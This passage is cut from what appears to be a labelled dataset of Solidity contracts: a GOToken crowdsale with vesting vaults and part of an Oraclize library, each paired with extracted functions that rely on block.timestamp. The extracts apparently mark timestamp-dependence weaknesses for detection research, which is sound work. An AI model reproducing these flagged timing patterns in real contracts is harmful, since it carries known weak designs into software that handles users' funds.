investments[beneficiary].released\n );\n }\n function releasableAmount(address beneficiary) public view returns (uint256) {\n return vestedAmount(beneficiary).sub(investments[beneficiary].released);\n }\n function vestedAmount(address beneficiary) public view returns (uint256) {\n uint256 vested = 0;\n if (block.timestamp >= cliff && block.timestamp < end) {\n uint256 totalBalance = investments[beneficiary].totalBalance;\n uint256 monthlyBalance = totalBalance.div(VESTING_DIV_RATE);\n uint256 time = block.timestamp.sub(cliff);\n uint256 elapsedOffsets = time.div(VESTING_INTERVAL);\n uint256 vestedToSum = elapsedOffsets.mul(monthlyBalance);\n vested = vested.add(vestedToSum);\n }\n if (block.timestamp >= end) {\n vested = investments[beneficiary].totalBalance;\n }\n return vested;\n }\n}\npragma solidity ^0.4.24;\ncontract PGOMonthlyPresaleVault is PGOMonthlyInternalVault {\n function vestedAmount(address beneficiary) public view returns (uint256) {\n uint256 vested = 0;\n if (block.timestamp >= start) {\n vested = investments[beneficiary].totalBalance.div(3);\n }\n if (block.timestamp >= cliff && block.timestamp < end) {\n uint256 unlockedStartBalance = investments[beneficiary].totalBalance.div(3);\n uint256 totalBalance = investments[beneficiary].totalBalance;\n uint256 lockedBalance = totalBalance.sub(unlockedStartBalance);\n uint256 monthlyBalance = lockedBalance.div(VESTING_DIV_RATE);\n uint256 daysToSkip = 90 days;\n uint256 time = block.timestamp.sub(start).sub(daysToSkip);\n uint256 elapsedOffsets = time.div(VESTING_INTERVAL);\n vested = vested.add(elapsedOffsets.mul(monthlyBalance));\n }\n if (block.timestamp >= end) {\n vested = investments[beneficiary].totalBalance;\n }\n return vested;\n }\n}",
  "extract_feature": [
    "function vestedAmount(address beneficiary) public view returns (uint256) {\nuint256 vested = 0;\nif (block.timestamp >= cliff && block.timestamp < end) {\nuint256 totalBalance = investments[beneficiary].totalBalance;\nuint256 monthlyBalance = totalBalance.div(VESTING_DIV_RATE);\nuint256 time = block.timestamp.sub(cliff);\nuint256 elapsedOffsets = time.div(VESTING_INTERVAL);\nuint256 vestedToSum = elapsedOffsets.mul(monthlyBalance);\nvested = vested.add(vestedToSum);\n}\nif (block.timestamp >= end) {\nvested = investments[beneficiary].totalBalance;\n}\nreturn vested;\n}",
    "function vestedAmount(address beneficiary) public view returns (uint256) {\nuint256 vested = 0;\nif (block.timestamp >= start) {\nvested = investments[beneficiary].totalBalance.div(3);\n}\nif (block.timestamp >= cliff && block.timestamp < end) {\nuint256 unlockedStartBalance = investments[beneficiary].totalBalance.div(3);\nuint256 totalBalance = investments[beneficiary].totalBalance;\nuint256 lockedBalance = totalBalance.sub(unlockedStartBalance);\nuint256 monthlyBalance = lockedBalance.div(VESTING_DIV_RATE);\nuint256 daysToSkip = 90 days;\nuint256 time = block.timestamp.sub(start).sub(daysToSkip);\nuint256 elapsedOffsets = time.div(VESTING_INTERVAL);\nvested = vested.add(elapsedOffsets.mul(monthlyBalance));\n}\nif (block.timestamp >= end) {\nvested = investments[beneficiary].totalBalance;\n}\nreturn vested;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f81"
  },
  "filename": "9379.sol",
  "content": "pragma solidity ^0.4.23;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\npragma solidity ^0.4.23;\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\npragma solidity ^0.4.23;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\npragma solidity ^0.4.23;\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\npragma solidity ^0.4.23;\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n require(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n require(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n require(token.approve(spender, value));\n }\n}\npragma solidity ^0.4.23;\ncontract CanReclaimToken is Ownable {\n using SafeERC20 for ERC20Basic;\n function reclaimToken(ERC20Basic token) external onlyOwner {\n uint256 balance = token.balanceOf(this);\n token.safeTransfer(owner, balance);\n }\n}\npragma solidity ^0.4.23;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\npragma solidity ^0.4.24;\ncontract KYCBase {\n using SafeMath for uint256;\n mapping (address => bool) public isKycSigner;\n mapping (uint64 => uint256) public alreadyPayed;\n event KycVerified(address indexed signer, address buyerAddress, uint64 buyerId, uint maxAmount);\n constructor(address[] kycSigners) internal {\n for (uint i = 0; i < kycSigners.length; i++) {\n isKycSigner[kycSigners[i]] = true;\n }\n }\n function releaseTokensTo(address buyer) internal returns(bool);\n function senderAllowedFor(address buyer)\n internal view returns(bool)\n {\n return buyer == msg.sender;\n }\n function buyTokensFor(address buyerAddress, uint64 buyerId, uint maxAmount, uint8 v, bytes32 r, bytes32 s)\n public payable returns (bool)\n {\n require(senderAllowedFor(buyerAddress));\n return buyImplementation(buyerAddress, buyerId, maxAmount, v, r, s);\n }\n function buyTokens(uint64 buyerId, uint maxAmount, uint8 v, bytes32 r, bytes32 s)\n public payable returns (bool)\n {\n return buyImplementation(msg.sender, buyerId, maxAmount, v, r, s);\n }\n function buyImplementation(address buyerAddress, uint64 buyerId, uint maxAmount, uint8 v, bytes32 r, bytes32 s)\n private returns (bool)\n {\n bytes32 hash = sha256(abi.encodePacked(\"Eidoo icoengine authorization\", this, buyerAddress, buyerId, maxAmount));\n address signer = ecrecover(hash, v, r, s);\n if (!isKycSigner[signer]) {\n revert();\n } else {\n uint256 totalPayed = alreadyPayed[buyerId].add(msg.value);\n require(totalPayed <= maxAmount);\n alreadyPayed[buyerId] = totalPayed;\n emit KycVerified(signer, buyerAddress, buyerId, maxAmount);\n return releaseTokensTo(buyerAddress);\n }\n }\n function () public {\n revert();\n }\n}\npragma solidity ^0.4.24;\ncontract ICOEngineInterface {\n function started() public view returns(bool);\n function ended() public view returns(bool);\n function startTime() public view returns(uint);\n function endTime() public view returns(uint);\n function totalTokens() public view returns(uint);\n function remainingTokens() public view returns(uint);\n function price() public view returns(uint);\n}\npragma solidity ^0.4.23;\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\npragma solidity ^0.4.23;\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint _subtractedValue\n )\n public\n returns (bool)\n {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\npragma solidity ^0.4.23;\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n modifier hasMintPermission() {\n require(msg.sender == owner);\n _;\n }\n function mint(\n address _to,\n uint256 _amount\n )\n hasMintPermission\n canMint\n public\n returns (bool)\n {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\npragma solidity ^0.4.23;\ncontract PausableToken is StandardToken, Pausable {\n function transfer(\n address _to,\n uint256 _value\n )\n public\n whenNotPaused\n returns (bool)\n {\n return super.transfer(_to, _value);\n }\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n whenNotPaused\n returns (bool)\n {\n return super.transferFrom(_from, _to, _value);\n }\n function approve(\n address _spender,\n uint256 _value\n )\n public\n whenNotPaused\n returns (bool)\n {\n return super.approve(_spender, _value);\n }\n function increaseApproval(\n address _spender,\n uint _addedValue\n )\n public\n whenNotPaused\n returns (bool success)\n {\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(\n address _spender,\n uint _subtractedValue\n )\n public\n whenNotPaused\n returns (bool success)\n {\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n}\npragma solidity ^0.4.23;\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n _burn(msg.sender, _value);\n }\n function _burn(address _who, uint256 _value) internal {\n require(_value <= balances[_who]);\n balances[_who] = balances[_who].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(_who, _value);\n emit Transfer(_who, address(0), _value);\n }\n}\npragma solidity ^0.4.24;\ncontract GotToken is CanReclaimToken, MintableToken, PausableToken, BurnableToken {\n string public constant name = \"GOToken\";\n string public constant symbol = \"GOT\";\n uint8 public constant decimals = 18;\n constructor() public {\n paused = true;\n }\n}\npragma solidity ^0.4.24;\ncontract PGOVault {\n using SafeMath for uint256;\n using SafeERC20 for GotToken;\n uint256[4] public vesting_offsets = [\n 360 days,\n 540 days,\n 720 days,\n 900 days\n ];\n uint256[4] public vesting_amounts = [\n 0.875e7 * 1e18,\n 0.875e7 * 1e18,\n 0.875e7 * 1e18,\n 0.875e7 * 1e18\n ];\n address public pgoWallet;\n GotToken public token;\n uint256 public start;\n uint256 public released;\n uint256 public vestingOffsetsLength = vesting_offsets.length;\n constructor(\n address _pgoWallet,\n address _token,\n uint256 _start\n )\n public\n {\n pgoWallet = _pgoWallet;\n token = GotToken(_token);\n start = _start;\n }\n function release() public {\n uint256 unreleased = releasableAmount();\n require(unreleased > 0);\n released = released.add(unreleased);\n token.safeTransfer(pgoWallet, unreleased);\n }\n function releasableAmount() public view returns (uint256) {\n return vestedAmount().sub(released);\n }\n function vestedAmount() public view returns (uint256) {\n uint256 vested = 0;\n for (uint256 i = 0; i < vestingOffsetsLength; i = i.add(1)) {\n if (block.timestamp > start.add(vesting_offsets[i])) {\n vested = vested.add(vesting_amounts[i]);\n }\n }\n return vested;\n }\n function unreleasedAmount() public view returns (uint256) {\n uint256 unreleased = 0;\n for (uint256 i = 0; i < vestingOffsetsLength; i = i.add(1)) {\n unreleased = unreleased.add(vesting_amounts[i]);\n }\n return unreleased.sub(released);\n }\n}\npragma solidity ^0.4.24;\ncontract PGOMonthlyInternalVault {\n using SafeMath for uint256;\n using SafeERC20 for GotToken;\n struct Investment {\n address beneficiary;\n uint256 totalBalance;\n uint256 released;\n }\n uint256 public constant VESTING_DIV_RATE = 21;\n uint256 public constant VESTING_INTERVAL = 30 days;\n uint256 public constant VESTING_CLIFF = 90 days;\n uint256 public constant VESTING_DURATION = 720 days;\n GotToken public token;\n uint256 public start;\n uint256 public end;\n uint256 public cliff;\n mapping(address => Investment) public investments;\n function init(address[] beneficiaries, uint256[] balances, uint256 startTime, address _token) public {\n require(token == address(0));\n require(beneficiaries.length == balances.length);\n start = startTime;\n cliff = start.add(VESTING_CLIFF);\n end = start.add(VESTING_DURATION);\n token = GotToken(_token);\n for (uint256 i = 0; i < beneficiaries.length; i = i.add(1)) {\n investments[beneficiaries[i]] = Investment(beneficiaries[i], balances[i], 0);\n }\n }\n function release(address beneficiary) public {\n uint256 unreleased = releasableAmount(beneficiary);\n require(unreleased > 0);\n investments[beneficiary].released = investments[beneficiary].released.add(unreleased);\n token.safeTransfer(beneficiary, unreleased);\n }\n function release() public {\n release(msg.sender);\n }\n function getInvestment(address beneficiary) public view returns(address, uint256, uint256) {\n return (\n investments[beneficiary].beneficiary,\n investments[beneficiary].totalBalance,\n investments[beneficiary].released\n );\n }\n function releasableAmount(address beneficiary) public view returns (uint256) {\n return vestedAmount(beneficiary).sub(investments[beneficiary].released);\n }\n function vestedAmount(address beneficiary) public view returns (uint256) {\n uint256 vested = 0;\n if (block.timestamp >= cliff && block.timestamp < end) {\n uint256 totalBalance = investments[beneficiary].totalBalance;\n uint256 monthlyBalance = totalBalance.div(VESTING_DIV_RATE);\n uint256 time = block.timestamp.sub(cliff);\n uint256 elapsedOffsets = time.div(VESTING_INTERVAL);\n uint256 vestedToSum = elapsedOffsets.mul(monthlyBalance);\n vested = vested.add(vestedToSum);\n }\n if (block.timestamp >= end) {\n vested = investments[beneficiary].totalBalance;\n }\n return vested;\n }\n}\npragma solidity ^0.4.24;\ncontract PGOMonthlyPresaleVault is PGOMonthlyInternalVault {\n function vestedAmount(address beneficiary) public view returns (uint256) {\n uint256 vested = 0;\n if (block.timestamp >= start) {\n vested = investments[beneficiary].totalBalance.div(3);\n }\n if (block.timestamp >= cliff && block.timestamp < end) {\n uint256 unlockedStartBalance = investments[beneficiary].totalBalance.div(3);\n uint256 totalBalance = investments[beneficiary].totalBalance;\n uint256 lockedBalance = totalBalance.sub(unlockedStartBalance);\n uint256 monthlyBalance = lockedBalance.div(VESTING_DIV_RATE);\n uint256 daysToSkip = 90 days;\n uint256 time = block.timestamp.sub(start).sub(daysToSkip);\n uint256 elapsedOffsets = time.div(VESTING_INTERVAL);\n vested = vested.add(elapsedOffsets.mul(monthlyBalance));\n }\n if (block.timestamp >= end) {\n vested = investments[beneficiary].totalBalance;\n }\n return vested;\n }\n}\npragma solidity ^0.4.24;\ncontract GotCrowdSale is Pausable, CanReclaimToken, ICOEngineInterface, KYCBase {\n uint256 public constant START_TIME = 1529416800;\n uint256 public constant END_TIME = 1530655140;\n uint256 public constant TOKEN_PER_ETHER = 740;\n uint256 public constant MONTHLY_INTERNAL_VAULT_CAP = 2.85e7 * 1e18;\n uint256 public constant PGO_UNLOCKED_LIQUIDITY_CAP = 1.5e7 * 1e18;\n uint256 public constant PGO_INTERNAL_RESERVE_CAP = 3.5e7 * 1e18;\n uint256 public constant RESERVED_PRESALE_CAP = 1.5754888e7 * 1e18;\n uint256 public constant RESERVATION_CAP = 0.4297111e7 * 1e18;\n uint256 public constant TOTAL_ICO_CAP = 0.5745112e7 * 1e18;\n uint256 public start;\n uint256 public end;\n uint256 public cap;\n uint256 public tokenPerEth;\n uint256 public availableTokens;\n address[] public kycSigners;\n bool public capReached;\n uint256 public weiRaised;\n uint256 public tokensSold;\n PGOMonthlyInternalVault public pgoMonthlyInternalVault;\n PGOMonthlyPresaleVault public pgoMonthlyPresaleVault;\n PGOVault public pgoVault;\n address public pgoInternalReserveWallet;\n address public pgoUnlockedLiquidityWallet;\n address public wallet;\n GotToken public token;\n bool public didOwnerEndCrowdsale;\n constructor(\n address _token,\n address _wallet,\n address _pgoInternalReserveWallet,\n address _pgoUnlockedLiquidityWallet,\n address _pgoMonthlyInternalVault,\n address _pgoMonthlyPresaleVault,\n address[] _kycSigners\n )\n public\n KYCBase(_kycSigners)\n {\n require(END_TIME >= START_TIME);\n require(TOTAL_ICO_CAP > 0);\n start = START_TIME;\n end = END_TIME;\n cap = TOTAL_ICO_CAP;\n wallet = _wallet;\n tokenPerEth = TOKEN_PER_ETHER;\n availableTokens = TOTAL_ICO_CAP;\n kycSigners = _kycSigners;\n token = GotToken(_token);\n pgoMonthlyInternalVault = PGOMonthlyInternalVault(_pgoMonthlyInternalVault);\n pgoMonthlyPresaleVault = PGOMonthlyPresaleVault(_pgoMonthlyPresaleVault);\n pgoInternalReserveWallet = _pgoInternalReserveWallet;\n pgoUnlockedLiquidityWallet = _pgoUnlockedLiquidityWallet;\n wallet = _wallet;\n pgoVault = new PGOVault(pgoInternalReserveWallet, address(token), END_TIME);\n }\n function mintPreAllocatedTokens() public onlyOwner {\n mintTokens(pgoUnlockedLiquidityWallet, PGO_UNLOCKED_LIQUIDITY_CAP);\n mintTokens(address(pgoVault), PGO_INTERNAL_RESERVE_CAP);\n }\n function initPGOMonthlyInternalVault(address[] beneficiaries, uint256[] balances)\n public\n onlyOwner\n equalLength(beneficiaries, balances)\n {\n uint256 totalInternalBalance = 0;\n uint256 balancesLength = balances.length;\n for (uint256 i = 0; i < balancesLength; i++) {\n totalInternalBalance = totalInternalBalance.add(balances[i]);\n }\n require(totalInternalBalance == MONTHLY_INTERNAL_VAULT_CAP);\n pgoMonthlyInternalVault.init(beneficiaries, balances, END_TIME, token);\n mintTokens(address(pgoMonthlyInternalVault), MONTHLY_INTERNAL_VAULT_CAP);\n }\n function initPGOMonthlyPresaleVault(address[] beneficiaries, uint256[] balances)\n public\n onlyOwner\n equalLength(beneficiaries, balances)\n {\n uint256 totalPresaleBalance = 0;\n uint256 balancesLength = balances.length;\n for (uint256 i = 0; i < balancesLength; i++) {\n totalPresaleBalance = totalPresaleBalance.add(balances[i]);\n }\n require(totalPresaleBalance == RESERVED_PRESALE_CAP);\n pgoMonthlyPresaleVault.init(beneficiaries, balances, END_TIME, token);\n mintTokens(address(pgoMonthlyPresaleVault), totalPresaleBalance);\n }\n function mintReservation(address[] beneficiaries, uint256[] balances)\n public\n onlyOwner\n equalLength(beneficiaries, balances)\n {\n uint256 totalReservationBalance = 0;\n uint256 balancesLength = balances.length;\n for (uint256 i = 0; i < balancesLength; i++) {\n totalReservationBalance = totalReservationBalance.add(balances[i]);\n uint256 amount = balances[i];\n tokensSold = tokensSold.add(amount);\n availableTokens = availableTokens.sub(amount);\n mintTokens(beneficiaries[i], amount);\n }\n require(totalReservationBalance <= RESERVATION_CAP);\n }\n function closeCrowdsale() public onlyOwner {\n require(block.timestamp >= START_TIME && block.timestamp < END_TIME);\n didOwnerEndCrowdsale = true;\n }\n function finalise() public onlyOwner {\n require(didOwnerEndCrowdsale || block.timestamp > end || capReached);\n token.finishMinting();\n token.unpause();\n token.transferOwnership(owner);\n }\n function price() public view returns (uint256 _price) {\n return tokenPerEth;\n }\n function started() public view returns(bool) {\n if (block.timestamp >= start) {\n return true;\n } else {\n return false;\n }\n }\n function ended() public view returns(bool) {\n if (block.timestamp >= end) {\n return true;\n } else {\n return false;\n }\n }\n function startTime() public view returns(uint) {\n return start;\n }\n function endTime() public view returns(uint) {\n return end;\n }\n function totalTokens() public view returns(uint) {\n return cap;\n }\n function remainingTokens() public view returns(uint) {\n return availableTokens;\n }\n function senderAllowedFor(address buyer) internal view returns(bool) {\n require(buyer != address(0));\n return true;\n }\n function releaseTokensTo(address buyer) internal returns(bool) {\n require(validPurchase());\n uint256 overflowTokens;\n uint256 refundWeiAmount;\n uint256 weiAmount = msg.value;\n uint256 tokenAmount = weiAmount.mul(price());\n if (tokenAmount >= availableTokens) {\n capReached = true;\n overflowTokens = tokenAmount.sub(availableTokens);\n tokenAmount = tokenAmount.sub(overflowTokens);\n refundWeiAmount = overflowTokens.div(price());\n weiAmount = weiAmount.sub(refundWeiAmount);\n buyer.transfer(refundWeiAmount);\n }\n weiRaised = weiRaised.add(weiAmount);\n tokensSold = tokensSold.add(tokenAmount);\n availableTokens = availableTokens.sub(tokenAmount);\n mintTokens(buyer, tokenAmount);\n forwardFunds(weiAmount);\n return true;\n }\n function forwardFunds(uint256 _weiAmount) internal {\n wallet.transfer(_weiAmount);\n }\n function validPurchase() internal view returns (bool) {\n require(!paused && !capReached);\n require(block.timestamp >= start && block.timestamp <= end);\n return true;\n }\n function mintTokens(address to, uint256 amount) private {\n token.mint(to, amount);\n }\n modifier equalLength(address[] beneficiaries, uint256[] balances) {\n require(beneficiaries.length == balances.length);\n _;\n }\n}",
  "extract_feature": [
    "function vestedAmount() public view returns (uint256) {\nuint256 vested = 0;\nfor (uint256 i = 0; i < vestingOffsetsLength; i = i.add(1)) {\nif (block.timestamp > start.add(vesting_offsets[i])) {\nvested = vested.add(vesting_amounts[i]);\n}\n}\nreturn vested;\n}",
    "function vestedAmount(address beneficiary) public view returns (uint256) {\nuint256 vested = 0;\nif (block.timestamp >= cliff && block.timestamp < end) {\nuint256 totalBalance = investments[beneficiary].totalBalance;\nuint256 monthlyBalance = totalBalance.div(VESTING_DIV_RATE);\nuint256 time = block.timestamp.sub(cliff);\nuint256 elapsedOffsets = time.div(VESTING_INTERVAL);\nuint256 vestedToSum = elapsedOffsets.mul(monthlyBalance);\nvested = vested.add(vestedToSum);\n}\nif (block.timestamp >= end) {\nvested = investments[beneficiary].totalBalance;\n}\nreturn vested;\n}",
    "function vestedAmount(address beneficiary) public view returns (uint256) {\nuint256 vested = 0;\nif (block.timestamp >= start) {\nvested = investments[beneficiary].totalBalance.div(3);\n}\nif (block.timestamp >= cliff && block.timestamp < end) {\nuint256 unlockedStartBalance = investments[beneficiary].totalBalance.div(3);\nuint256 totalBalance = investments[beneficiary].totalBalance;\nuint256 lockedBalance = totalBalance.sub(unlockedStartBalance);\nuint256 monthlyBalance = lockedBalance.div(VESTING_DIV_RATE);\nuint256 daysToSkip = 90 days;\nuint256 time = block.timestamp.sub(start).sub(daysToSkip);\nuint256 elapsedOffsets = time.div(VESTING_INTERVAL);\nvested = vested.add(elapsedOffsets.mul(monthlyBalance));\n}\nif (block.timestamp >= end) {\nvested = investments[beneficiary].totalBalance;\n}\nreturn vested;\n}",
    "function closeCrowdsale() public onlyOwner {\nrequire(block.timestamp >= START_TIME && block.timestamp < END_TIME);\ndidOwnerEndCrowdsale = true;\n}",
    "function finalise() public onlyOwner {\nrequire(didOwnerEndCrowdsale || block.timestamp > end || capReached);\ntoken.finishMinting();\ntoken.unpause();\ntoken.transferOwnership(owner);\n}",
    "function started() public view returns(bool) {\nif (block.timestamp >= start) {\nreturn true;\n} else {\nreturn false;\n}\n}",
    "function ended() public view returns(bool) {\nif (block.timestamp >= end) {\nreturn true;\n} else {\nreturn false;\n}\n}",
    "function validPurchase() internal view returns (bool) {\nrequire(!paused && !capReached);\nrequire(block.timestamp >= start && block.timestamp <= end);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f82"
  },
  "filename": "9428.sol",
  "content": "pragma solidity ^0.4.18;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) external payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) external payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) public payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) external payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) public payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) external payable returns (bytes32 _id);\n function getPrice(string _datasource) public returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) public returns (uint _dsprice);\n function setProofType(byte _proofType) external;\n function setCustomGasPrice(uint _gasPrice) external;\n function randomDS_getSessionPubKeyHash() external constant returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() public returns (address _addr);\n}\nlibrary Buffer {\n struct buffer {\n bytes buf;\n uint capacity;\n }\n function init(buffer memory buf, uint capacity) internal pure {\n if(capacity % 32 != 0) capacity += 32 - (capacity % 32);\n buf.capacity = capacity;\n assembly {\n let ptr := mload(0x40)\n mstore(buf, ptr)\n mstore(0x40, add(ptr, capacity))\n }\n }\n function resize(buffer memory buf, uint capacity) private pure {\n bytes memory oldbuf = buf.buf;\n init(buf, capacity);\n append(buf, oldbuf);\n }\n function max(uint a, uint b) private pure returns(uint) {\n if(a > b) {\n return a;\n }\n return b;\n }\n function append(buffer memory buf, bytes data) internal pure returns(buffer memory) {\n if(data.length + buf.buf.length > buf.capacity) {\n resize(buf, max(buf.capacity, data.length) * 2);\n }\n uint dest;\n uint src;\n uint len = data.length;\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n dest := add(add(bufptr, buflen), 32)\n mstore(bufptr, add(buflen, mload(data)))\n src := add(data, 32)\n }\n for(; len >= 32; len -= 32) {\n assembly {\n mstore(dest, mload(src))\n }\n dest += 32;\n src += 32;\n }\n uint mask = 256 ** (32 - len) - 1;\n assembly {\n let srcpart := and(mload(src), not(mask))\n let destpart := and(mload(dest), mask)\n mstore(dest, or(destpart, srcpart))\n }\n return buf;\n }\n function append(buffer memory buf, uint8 data) internal pure {\n if(buf.buf.length + 1 > buf.capacity) {\n resize(buf, buf.capacity * 2);\n }\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n let dest := add(add(bufptr, buflen), 32)\n mstore8(dest, data)\n mstore(bufptr, add(buflen, 1))\n }\n }\n function appendInt(buffer memory buf, uint data, uint len) internal pure returns(buffer memory) {\n if(len + buf.buf.length > buf.capacity) {\n resize(buf, max(buf.capacity, len) * 2);\n }\n uint mask = 256 ** len - 1;\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n let dest := add(add(bufptr, buflen), len)\n mstore(dest, or(and(mload(dest), not(mask)), data))\n mstore(bufptr, add(buflen, len))\n }\n return buf;\n }\n}\nlibrary CBOR {\n using Buffer for Buffer.buffer;\n uint8 private constant MAJOR_TYPE_INT = 0;\n uint8 private constant MAJOR_TYPE_NEGATIVE_INT = 1;\n uint8 private constant MAJOR_TYPE_BYTES = 2;\n uint8 private constant MAJOR_TYPE_STRING = 3;\n uint8 private constant MAJOR_TYPE_ARRAY = 4;\n uint8 private constant MAJOR_TYPE_MAP = 5;\n uint8 private constant MAJOR_TYPE_CONTENT_FREE = 7;\n function encodeType(Buffer.buffer memory buf, uint8 major, uint value) private pure {\n if(value <= 23) {\n buf.append(uint8((major << 5) | value));\n } else if(value <= 0xFF) {\n buf.append(uint8((major << 5) | 24));\n buf.appendInt(value, 1);\n } else if(value <= 0xFFFF) {\n buf.append(uint8((major << 5) | 25));\n buf.appendInt(value, 2);\n } else if(value <= 0xFFFFFFFF) {\n buf.append(uint8((major << 5) | 26));\n buf.appendInt(value, 4);\n } else if(value <= 0xFFFFFFFFFFFFFFFF) {\n buf.append(uint8((major << 5) | 27));\n buf.appendInt(value, 8);\n }\n }\n function encodeIndefiniteLengthType(Buffer.buffer memory buf, uint8 major) private pure {\n buf.append(uint8((major << 5) | 31));\n }\n function encodeUInt(Buffer.buffer memory buf, uint value) internal pure {\n encodeType(buf, MAJOR_TYPE_INT, value);\n }\n function encodeInt(Buffer.buffer memory buf, int value) internal pure {\n if(value >= 0) {\n encodeType(buf, MAJOR_TYPE_INT, uint(value));\n } else {\n encodeType(buf, MAJOR_TYPE_NEGATIVE_INT, uint(-1 - value));\n }\n }\n function encodeBytes(Buffer.buffer memory buf, bytes value) internal pure {\n encodeType(buf, MAJOR_TYPE_BYTES, value.length);\n buf.append(value);\n }\n function encodeString(Buffer.buffer memory buf, string value) internal pure {\n encodeType(buf, MAJOR_TYPE_STRING, bytes(value).length);\n buf.append(bytes(value));\n }\n function startArray(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_ARRAY);\n }\n function startMap(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_MAP);\n }\n function endSequence(Buffer.buffer memory buf) internal pure {\n 